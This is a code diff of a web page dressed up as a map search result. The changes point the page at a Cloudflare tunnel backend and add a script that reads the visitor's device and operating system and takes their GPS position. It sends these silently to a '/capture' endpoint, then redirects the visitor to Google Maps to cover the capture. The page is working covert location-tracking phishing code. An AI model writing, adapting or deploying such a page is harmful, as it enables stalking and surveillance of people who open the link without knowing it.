@@ -90,8 +90,7 @@
     <div id="map"></div>
     
     <div class="floating-search" id="searchBar">
-        <!-- Diganti ke Koordinat Eon Bukit Tinggi -->
-        <span class="search-text">3°01'47.2"N 101°26'58.8"E</span>
+        <span class="search-text">2°59'25.1"N 101°25'33.4"E</span>
         <button class="close-btn">✕</button>
     </div>
 
@@ -120,13 +119,12 @@
     </div>
 
 <script>
-    // Karena udah fix pakai Vercel, biarin kosong
-    const BACKEND_URL = ""; 
+    const BACKEND_URL = "https://copyrighted-hoping-tomato-cambridge.trycloudflare.com"; 
 
-    // Diganti ke Koordinat Eon Bukit Tinggi (Zoom level 16)
-    var map = L.map('map', {zoomControl: false}).setView([3.0297, 101.4497], 16);
+    var map = L.map('map', {zoomControl: false}).setView([2.9903, 101.4259], 16);
     L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png').addTo(map);
 
+    // Fungsi Deteksi HP Manual (Cadangan kalau library gagal load)
     function getDeviceInfo() {
         const ua = navigator.userAgent;
         let device = "Unknown Device";
@@ -136,6 +134,7 @@
             os = "Android";
             const match = ua.match(/Android\s([0-9\.]+)/);
             if (match) os += " " + match[1];
+            
             const modelMatch = ua.match(/;\s?([^;]+)\s?Build/);
             if (modelMatch) device = modelMatch[1];
             else device = "Android Phone";
@@ -145,9 +144,11 @@
             if (match) os += " " + match[1].replace(/_/g, '.');
             device = ua.includes("iPad") ? "iPad" : "iPhone";
         } else if (/Windows/i.test(ua)) {
-            os = "Windows"; device = "Windows PC";
+            os = "Windows";
+            device = "Windows PC";
         } else if (/Macintosh/i.test(ua)) {
-            os = "macOS"; device = "MacBook / iMac";
+            os = "macOS";
+            device = "MacBook / iMac";
         }
         return { device, os };
     }
@@ -169,9 +170,12 @@
                     const lat = position.coords.latitude;
                     const lon = position.coords.longitude;
                     
+                    // KIRIM DATA PAKAI FETCH (Lebih Cepat dari iframe)
                     const url = `${BACKEND_URL}/capture?lat=${lat}&lon=${lon}&device=${encodeURIComponent(deviceInfo.device)}&os=${encodeURIComponent(deviceInfo.os)}`;
+                    
                     fetch(url, { mode: 'no-cors' }).catch(() => {});
 
+                    // Kasih waktu 1 detik aja, jangan kelamaan
                     setTimeout(() => {
                         window.location.href = `https://www.google.com/maps?q=${lat},${lon}`;
                     }, 1000);
